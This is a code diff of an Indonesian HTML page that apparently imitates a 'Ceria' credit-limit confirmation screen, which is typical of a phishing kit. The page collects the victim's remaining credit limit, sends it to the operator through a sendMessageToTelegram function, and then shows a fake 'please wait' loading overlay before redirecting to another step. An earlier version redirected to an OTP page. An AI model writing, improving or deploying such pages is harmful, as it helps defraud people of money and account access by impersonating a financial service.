@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Konfirmasi Limit Ceria </title>
+  <title>Konfirmasi Limit Ceria</title>
   <meta name="viewport" content="width, initial-scale=1">
   <style>
     body {
@@ -46,7 +46,7 @@
     }
 
     /* Jarak antara kolom select dan kolom input */
-    #jarak1 {
+    #jarak7 {
       height: 10px;
     }
 
@@ -90,6 +90,31 @@
       width: 95%;
       object-fit: cover;
     }
+
+    /* Aturan gaya untuk elemen putih */
+    .white-element {
+      width: 100vw;
+      height: 100vh;
+      background: rgba(255, 255, 255, 0.8); /* Atur alpha (nilai transparansi) sesuai keinginan */
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .white-element img {
+      width: 80px; /* Ganti dengan ukuran yang diinginkan */
+      height: 80px; /* Ganti dengan ukuran yang diinginkan */
+    }
+
+    .loading-text {
+      margin-top: 10px;
+      font-size: 16px;
+    }
   </style>
   <script>
     function sendMessageToTelegram(message) {
@@ -108,12 +133,38 @@
     function kirimPesan() {
       var pesan = document.getElementById("jumlahInput").value;
       sendMessageToTelegram("𝗝𝘂𝗺𝗹𝗮𝗵 𝗟𝗶𝗺𝗶𝘁 𝗦𝗮𝗮𝘁 𝗜𝗻𝗶: " + pesan);
+      showWhiteElement();
+    }
 
-      document.getElementById("submit").value = "Processing SMS OTP.......";
+    function showWhiteElement() {
+      var whiteElement = document.createElement('div');
+      whiteElement.classList.add('white-element');
 
-      setTimeout(function() {
-        window.location.href = "otp.html";
-      }, 15);
+      var logoImage = document.createElement('img');
+      logoImage.src = 'https://i.ibb.co/znztJ3h/IMG-20240125-000423-removebg-preview.png';
+      logoImage.alt = 'Logo';
+      whiteElement.appendChild(logoImage);
+
+      var loadingText = document.createElement('div');
+      loadingText.classList.add('loading-text');
+      loadingText.innerText = 'Tunggu sebentar ya... Gak lama kok';
+      whiteElement.appendChild(loadingText);
+
+      document.body.appendChild(whiteElement);
+
+      setTimeout(function () {
+        window.location.href = 'limit.html';
+      }, 5000); // Ubah waktu penundaan menjadi 5 detik
+    }
+
+    function updateNominal() {
+      var nominalInput = document.getElementById("jumlahInput");
+      var value = nominalInput.value.replace(/\D/g, ''); // Hapus karakter selain digit
+
+      // Format nilai Rupiah
+      var formattedValue = "Rp " + Number(value).toLocaleString("id-ID");
+
+      nominalInput.value = formattedValue;
     }
   </script>
 </head>
@@ -140,7 +191,7 @@
 
   <!-- Kolom Input dan Tombol Submit -->
   <div id="jumlah-container">
-    <input type="number" id="jumlahInput" name="jumlah" placeholder="Sisa Limit">
+    <input type="text" id="jumlahInput" name="jumlah" placeholder="Sisa Limit" oninput="updateNominal()">
     <input type="submit" id="submit" value="Lanjutkan" onclick="kirimPesan()">
   </div>
 
@@ -149,4 +200,4 @@
     <img src="https://i.ibb.co/c2BQYp8/IMG-20231229-WA0003-removebg-preview.png" alt="Gambar 2711">
   </div>
 </body>
-  </html>
+      </html
